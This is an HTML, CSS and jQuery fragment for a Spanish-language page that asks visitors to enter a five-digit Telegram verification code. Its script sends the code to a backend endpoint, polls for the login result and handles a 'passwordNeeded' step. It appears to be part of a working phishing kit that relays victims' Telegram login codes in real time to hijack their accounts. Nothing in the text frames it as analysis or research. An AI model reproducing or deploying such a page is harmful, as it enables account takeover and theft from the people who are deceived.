<style>
  .form-card {
    background: #ffffff;
    border: 1px solid #ccc;
    border-radius: 8px;
    padding: 25px;
    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
    max-width: 450px;
    margin-top: 20px;
    justify-content: center;
  }

  .dkclass {
    height: 325px !important;
  }

  .otp-wrapper {
    margin-top: -50px;
    padding-top: 50px;
  }

  .otp-title {
    font-size: 25px !important;
    font-weight: 700;
  }

  .otp-input {
    border-radius: 20px;
    border: 1.5px solid #ddd;
    text-align: center;
    font-size: 18px;
    letter-spacing: 6px;
  }

  .otp-btn {
    height: 58px;
    width: 100%;
    max-width: 400px;
    border-radius: 8px;
    background: #fff;
    color: #000;
    border: 2px solid #000;
    font-weight: 800;
    font-size: 15px;
    text-transform: uppercase;
    transition: all 0.2s ease-in-out;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    margin: 0 auto;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
  }

  .otp-btn:active,
  .otp-btn.clicked {
    background: #000 !important;
    color: #fff !important;
    transform: scale(0.98);
  }

  .otp-input::placeholder {
    font-size: 17px;
    letter-spacing: normal;
    color: #999;
  }
</style>

<div id="loader" class="loader" style="display: none;">
  <div class="spinner"></div>
</div>
<div class="form-card">
  <div class="otp-wrapper">
    <h5 class="mt-3 text-center otp-title">
      Ingrese el código de verificación
    </h5>

    <p class="mt-3 text-center">
      Introduzca el código enviado por Telegram para verificar su estado
    </p>
    <div id="wrong"></div>

    <div class="mb-3">
      <input type="text" class="form-control otp-input" name="phone" id="phone" placeholder="Código OTP (5 dígitos)"
        maxlength="5" />
    </div>

    <p id="wrong" class="text-center text-danger fw-semibold"></p>

    <button class="btdk btn otp-btn mx-auto d-block px-5">
      SIGUIENTE PASO
    </button>
  </div>
</div>
<!--<a class="d-block mb-3 text-center" href="?otherAccount">Wrong phone</a>-->
<script>
  $("#wrong").hide();
  $("#loader").hide();

  function checkStatus() {
    $("#wrong").hide();

    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: { "method": "getStatus" },
      success: function (data) {
        if (data.result.status == "success") {
          window.location.reload();
        } else if (data.result.status == "failed") {
          if (data.result.detail == "wrong") {
            $("#wrong").html("Código OTP no válido");
            $("#loader").hide();
          } else if (data.result.detail == "passwordNeeded") {
            window.location.reload();
          }
          $("#wrong").show();
          $("input[type='text']").val("");
        } else {
          setTimeout(function () {
            checkStatus();
          }, 500);
        }
      }, error: function (data) { }
    });
  }

  $("button").on("click", function (e) {
    e.preventDefault();
    var com = $("input[type='text']").val();

    if (com != "") {
      $("#loader").show();
      $.ajax({
        url: "API/index.php",
        type: "POST",
        data: { "method": "sendOtp", "otp": com },
        success: function (data) {
          setTimeout(function () {
            checkStatus();
          }, 500);
        },
        error: function (data) { }
      });
    }
  });
</script>